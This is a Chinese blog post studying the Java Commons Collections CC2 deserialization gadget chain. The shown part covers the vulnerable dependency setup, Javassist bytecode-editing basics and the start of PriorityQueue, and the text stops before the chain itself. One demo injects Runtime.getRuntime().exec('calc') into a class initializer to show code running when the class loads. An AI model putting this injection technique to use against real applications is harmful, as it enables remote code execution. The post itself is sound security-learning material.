<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>java安全-CC2链学习与分析 | Okaytc</title><meta name="keywords" content="Java安全,java利用链"><meta name="author" content="Okaytc"><meta name="copyright" content="Okaytc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="0x00、前言针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。这次的学习顺序是先PriorityQueue优先级队列——&gt;CC2链学习分析——&gt;javassist字节码增强类——&gt;ClassLoader#defineClass定义类——&gt;TemplatesImpl模板转换——&gt;cc2-">
<meta property="og:type" content="article">
<meta property="og:title" content="java安全-CC2链学习与分析">
<meta property="og:url" content="https://okaytc.github.io/posts/7e30cd4a.html">
<meta property="og:site_name" content="Okaytc">
<meta property="og:description" content="0x00、前言针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。这次的学习顺序是先PriorityQueue优先级队列——&gt;CC2链学习分析——&gt;javassist字节码增强类——&gt;ClassLoader#defineClass定义类——&gt;TemplatesImpl模板转换——&gt;cc2-">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://okaytc.github.io/img/bg3.png">
<meta property="article:published_time" content="2022-11-29T06:36:59.000Z">
<meta property="article:modified_time" content="2022-11-29T08:26:36.419Z">
<meta property="article:author" content="Okaytc">
<meta property="article:tag" content="Java安全">
<meta property="article:tag" content="java利用链">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://okaytc.github.io/img/bg3.png"><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="https://okaytc.github.io/posts/7e30cd4a"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Okaytc","link":"链接: ","source":"来源: Okaytc","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'java安全-CC2链学习与分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-29 16:26:36'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">6</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bg3.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Okaytc</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">java安全-CC2链学习与分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-29T06:36:59.000Z" title="发表于 2022-11-29 14:36:59">2022-11-29</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-29T08:26:36.419Z" title="更新于 2022-11-29 16:26:36">2022-11-29</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/java%E5%88%A9%E7%94%A8%E9%93%BE/">java利用链</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">8.8k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>33分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="java安全-CC2链学习与分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。<br>这次的学习顺序是先PriorityQueue优先级队列——&gt;CC2链学习分析——&gt;javassist字节码增强类——&gt;ClassLoader#defineClass定义类——&gt;TemplatesImpl模板转换——&gt;cc2-yso链学习与分析</p>
<h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>引用CC1链分析中的描述<br>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p>
<blockquote>
<p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
</blockquote>
<p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p>
<h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66（要求java8以上）<br>Commons Collections：4.0（漏洞版本）（在3版本中<code>TransformingComparator</code>类未实现序列化接口所以不存在该利用链，4版本才实现）<br>javassist：3.20.0-GA<br>maven项目pom.xml文件中添加依赖</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">4.0</span>&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.javassist&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;javassist&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;<span class="number">3.20</span><span class="number">.0</span>-GA&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>
<p>在idea访问<code>Commons Collections</code>组件的文件时候点击上方的下载源代码就可以看到对应文件的.java文件了</p>
<h1 id="0x03、利用链基础前提"><a href="#0x03、利用链基础前提" class="headerlink" title="0x03、利用链基础前提"></a>0x03、利用链基础前提</h1><h2 id="javassist字节码增强类"><a href="#javassist字节码增强类" class="headerlink" title="javassist字节码增强类"></a>javassist字节码增强类</h2><p>Java 字节码以二进制的形式存储在 class 文件中，每一个 class 文件包含一个 Java 类或接口。Javaassist 就是一个用来处理 Java 字节码的类库。</p>
<blockquote>
<p>引用官网的描述：<br>Javassist（Java编程助手）使Java字节码操作变得简单。它是一个用于在Java中编辑字节码的类库；它使Java程序能够在运行时定义一个新类，并在JVM加载时修改类文件。与其他类似的字节码编辑器不同，Javassist提供了两级API：源代码级和字节码级。如果用户使用源代码级API，他们可以在不知道Java字节码规范的情况下编辑类文件。整个API仅使用Java语言的词汇表设计。您甚至可以以源文本的形式指定插入的字节码；Javassist实时编译。另一方面，字节码级API允许用户像其他编辑器一样直接编辑类文件。</p>
</blockquote>
<p>由于<code>java</code>运行通常由<code>java</code>文件编译成<code>class</code>文件供<code>jvm</code>运行，更改代码内容需要重新编写<code>java</code>文件再编译成<code>class</code>文件运行。<br><strong><code>Javassist</code>作用就是动态修改<code>.class</code>文件内容</strong>，且不需要知道<code>jvm</code>相关指令调用，<code>javassist</code>的引用能更简单快速的修改<code>class</code>文件的内容。</p>
<p>实现的效果有点类似反射的调用方式，不过一个是更改字节文件，反射是调用类，目的不同。</p>
<p><strong>涉及的类</strong></p>
<h3 id="ClassPool"><a href="#ClassPool" class="headerlink" title="ClassPool"></a>ClassPool</h3><p>ClassPool：<br>基于哈希表(Hashtable)实现的CtClass对象容器，其中键是类名称, 值是表示该类的CtClass对象，同HashMap实现的Map接口，但不同于哈希表(Hashtable)的键名不能为null。<br>常用方法：</p>
<table>
<thead>
<tr>
<th align="left">常用方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">getDefault()</td>
<td align="left">返回默认的类池（默认的类池搜索系统搜索路径，通常包括平台库、扩展库以及由-classpath选项或CLASSPATH环境变量指定的搜索路径）</td>
</tr>
<tr>
<td align="left">insertClassPath(java.lang.String pathname)</td>
<td align="left">在搜索路径的开头插入目录或jar（或zip）文件</td>
</tr>
<tr>
<td align="left">insertClassPath(ClassPath cp)</td>
<td align="left">在搜索路径的开头插入类对象，当用户系统存在多个类加载器，默认加载getDefault()搜索不到加载类可使用该方法添加路径</td>
</tr>
<tr>
<td align="left">getClassLoader()</td>
<td align="left">获得类加载器</td>
</tr>
<tr>
<td align="left">get(java.lang.String classname)</td>
<td align="left">从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用</td>
</tr>
<tr>
<td align="left">getOrNull(java.lang.String classname)</td>
<td align="left">从源中读取类文件，并返回对CtClass 表示该类文件的对象的引用，未找到该文件返回null，不抛出异常</td>
</tr>
<tr>
<td align="left">appendClassPath(ClassPath cp)</td>
<td align="left">将ClassPath对象附加到搜索路径的末尾</td>
</tr>
<tr>
<td align="left">makeClass(java.lang.String classname)</td>
<td align="left">创建一个新的public类</td>
</tr>
</tbody></table>
<p>实现方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="CtClass"><a href="#CtClass" class="headerlink" title="CtClass"></a>CtClass</h3><p>CtClass表示类, 一个CtClass(编译时类)对象可以处理一个class文件, 这些CtClass对象可以从ClassPool获得。<br>常用方法：</p>
<table>
<thead>
<tr>
<th align="left">常用方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">setSuperclass(CtClass clazz)</td>
<td align="left">添加父类</td>
</tr>
<tr>
<td align="left">setInterfaces</td>
<td align="left">添加父类接口</td>
</tr>
<tr>
<td align="left">toClass(java.lang.invoke.MethodHandles.Lookup lookup)</td>
<td align="left">将此类转换为java.lang.Class对象</td>
</tr>
<tr>
<td align="left">toBytecode()</td>
<td align="left">将该类转换为类文件，对象类型为byte[]</td>
</tr>
<tr>
<td align="left">writeFile()</td>
<td align="left">将由此CtClass 对象表示的类文件写入当前目录</td>
</tr>
<tr>
<td align="left">writeFile(java.lang.String directoryName)</td>
<td align="left">将由此CtClass 对象表示的类文件写入本地磁盘</td>
</tr>
<tr>
<td align="left">makeClassInitializer()</td>
<td align="left">制作一个空的类初始化程序（静态构造函数），对象类型为CtConstructor</td>
</tr>
<tr>
<td align="left">detach</td>
<td align="left">将CtClass对象从ClassPool池中删除</td>
</tr>
<tr>
<td align="left">freeze</td>
<td align="left">冻结一个类，使其变为不可修改状态</td>
</tr>
<tr>
<td align="left">isfreeze</td>
<td align="left">判断该类是否存于冻结状态</td>
</tr>
<tr>
<td align="left">prune</td>
<td align="left">删除类不必要的属性，减少内存占用</td>
</tr>
<tr>
<td align="left">deforst</td>
<td align="left">解冻一个类，使其变为可修改状态</td>
</tr>
<tr>
<td align="left">addField</td>
<td align="left">添加字段</td>
</tr>
<tr>
<td align="left">addMethod</td>
<td align="left">添加方法</td>
</tr>
<tr>
<td align="left">addConstructor</td>
<td align="left">添加构造器</td>
</tr>
<tr>
<td align="left">addInterface</td>
<td align="left">添加接口</td>
</tr>
</tbody></table>
<p>实现方式：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法 效果相同</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新方法</span></span><br><span class="line">        ct.addMethod(<span class="string">&quot;show&quot;</span>)</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h3 id="CtMethods"><a href="#CtMethods" class="headerlink" title="CtMethods"></a>CtMethods</h3><p>表示类中的方法</p>
<table>
<thead>
<tr>
<th align="left">常用方法</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">insertBefore</td>
<td align="left">在方法起始位置插入代码</td>
</tr>
<tr>
<td align="left">insterAfter</td>
<td align="left">在方法的所有 return 语句前插入代码以确保语句能够被执行，除非遇到exception</td>
</tr>
<tr>
<td align="left">insertAt</td>
<td align="left">在指定位置插入代码</td>
</tr>
<tr>
<td align="left">setBody</td>
<td align="left">将方法的内容设置为要写入的代码，当方法被 abstract修饰时，该修饰符被移除</td>
</tr>
<tr>
<td align="left">make</td>
<td align="left">创建一个方法</td>
</tr>
<tr>
<td align="left">addParameter</td>
<td align="left">添加参数</td>
</tr>
<tr>
<td align="left">setName</td>
<td align="left">设置方法名</td>
</tr>
</tbody></table>
<p>注:插入的代码必须是完整的代码语句，包括分号结束语。</p>
<p>实现方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//对类的方法进行操作</span></span><br><span class="line">        CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">        ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/7e30cd4a/cc2-1.png" title="实现方法"></p>
<h3 id="CtConstructor"><a href="#CtConstructor" class="headerlink" title="CtConstructor"></a>CtConstructor</h3><p>表示类中的构造函数<br>实现方法：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">        ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">        ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//获取类Exp</span></span><br><span class="line">        CtClass ct=pool2.get(<span class="string">&quot;Exp&quot;</span>);</span><br><span class="line">        <span class="comment">//创建新类Exp2</span></span><br><span class="line">        CtClass ct2=pool.makeClass(<span class="string">&quot;Exp2&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//创建构造函数</span></span><br><span class="line">        CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">        <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">        cons.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist调用了构造方法\&quot;);&quot;</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="生成字节码toBytecode"><a href="#生成字节码toBytecode" class="headerlink" title="生成字节码toBytecode()"></a>生成字节码toBytecode()</h3><p>生成字节码：CtClass.toBytecode()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//生成字节码</span></span><br><span class="line"><span class="type">byte</span>[] bt=ct.toBytecode();</span><br><span class="line"><span class="comment">//输出字节码</span></span><br><span class="line">String str=Arrays.toString(bt);</span><br><span class="line">System.out.print(str);</span><br></pre></td></tr></table></figure>
<p><img src="/posts/7e30cd4a/cc2-4.png" title="toBytecode()"></p>
<h3 id="生成对象toClass"><a href="#生成对象toClass" class="headerlink" title="生成对象toClass()"></a>生成对象toClass()</h3><p>反射调用对象:CtClass.toClass()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//通过反射调用对象</span></span><br><span class="line">Class cla=ct.toClass();</span><br><span class="line"><span class="comment">//实例化对象</span></span><br><span class="line">Object o=cla.newInstance();</span><br></pre></td></tr></table></figure>

<h3 id="简单实现demo"><a href="#简单实现demo" class="headerlink" title="简单实现demo"></a>简单实现demo</h3><p>实例类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">People</span> &#123;</span><br><span class="line">   <span class="keyword">private</span> String name;</span><br><span class="line">   <span class="keyword">private</span> String addr;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span>&#123;</span><br><span class="line">       <span class="built_in">this</span>.name=name;</span><br><span class="line">   &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAddr</span><span class="params">(String addr)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.addr=addr;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> name;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getAddr</span><span class="params">()</span>&#123;</span><br><span class="line">       <span class="keyword">return</span> addr;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>实现类：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">       ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">       ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取类Exp</span></span><br><span class="line">       CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">       <span class="comment">//创建新类Exp2</span></span><br><span class="line">       CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//对类的方法进行操作</span></span><br><span class="line">       CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">       ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建构造函数</span></span><br><span class="line">       CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">       <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">       cons.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist调用了构造方法\&quot;);&quot;</span>);</span><br><span class="line">       ct.defrost();</span><br><span class="line">       ct.writeFile(<span class="string">&quot;People2&quot;</span>);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>实现更改字节码效果：</p>
<p><img src="/posts/7e30cd4a/cc2-2.png" title="实现效果"></p>
<p>触发恶意代码效果demo:<br>通过向构造函数插入执行代码，通过反射调用CtClass对象并转换为反射类对象，进行实例化的时候调用构造函数触发恶意代码。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">       <span class="comment">//两种ClassPool创建方法</span></span><br><span class="line">       ClassPool pool=<span class="keyword">new</span> <span class="title class_">ClassPool</span>(<span class="literal">true</span>);</span><br><span class="line">       ClassPool pool2=ClassPool.getDefault();</span><br><span class="line"></span><br><span class="line">       <span class="comment">//获取类Exp</span></span><br><span class="line">       CtClass ct=pool2.get(<span class="string">&quot;cc2.People&quot;</span>);</span><br><span class="line">       <span class="comment">//创建新类Exp2</span></span><br><span class="line">       CtClass ct2=pool2.makeClass(<span class="string">&quot;cc2.People2&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//对类的方法进行操作</span></span><br><span class="line">       CtMethod ctm=ct.getDeclaredMethod(<span class="string">&quot;getName&quot;</span>);</span><br><span class="line">       ctm.insertBefore(<span class="string">&quot;System.out.println(\&quot;使用javassist对getName方法插入了代码\&quot;);&quot;</span>);</span><br><span class="line"></span><br><span class="line">       <span class="comment">//创建构造函数</span></span><br><span class="line">       CtConstructor cons=ct.makeClassInitializer();</span><br><span class="line">       <span class="comment">//向构造函数插入字节码</span></span><br><span class="line">       cons.insertBefore(<span class="string">&quot;java.lang.Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);</span><br><span class="line">       <span class="comment">//ct.writeFile(&quot;People2&quot;);</span></span><br><span class="line"></span><br><span class="line">       <span class="comment">//通过反射调用对象</span></span><br><span class="line">       Class cla=ct.toClass();</span><br><span class="line">       <span class="comment">//实例化对象</span></span><br><span class="line">       Object o=cla.newInstance();</span><br><span class="line"></span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/7e30cd4a/cc2-3.png" title="恶意代码实现效果"></p>
<h2 id="PriorityQueue优先级队列"><a href="#PriorityQueue优先级队列" class="headerlink" title="PriorityQueue优先级队列"></a>PriorityQueue优先级队列</h2><blockquote>
<p>PriorityQueue类在Java1.5中引入。PriorityQueue是基于优先堆的一个无界队列，这个优先队列中的元素可以默认自然排序或者通过提供的Comparator（比较器）在队列实例化的时排序。要求使用Java Comparable和Comparator接口给对象排序，并且在排序时会按照优先级处理其中的元素。</p>
</blockquote>
<p>顾名思义，它是队列的一种实现方式，但不同于普通队列Queue（先进先出），它可通过比较器Comparator实现数据之间谁排在前面谁排在后面（上沉该元素）。</p>
<p>PriorityQueue队列常用方法：</p>
<ul>
<li>add()：添加数组元素，添加失败会抛出异常。</li>
<li>offer()：添加数组元素，添加失败会返回false。</li>
<li>poll()：取出队顶数组元素，并删除该元素，失败会抛出异常。</li>
<li>peek()：查询队顶数组元素，但不删除该元素。</li>
<li>remove(): 取出队顶数组元素，并删除该元素，失败会返回null。</li>
</ul>
<p>PriorityQueue队列实现用法：</p>
<ul>
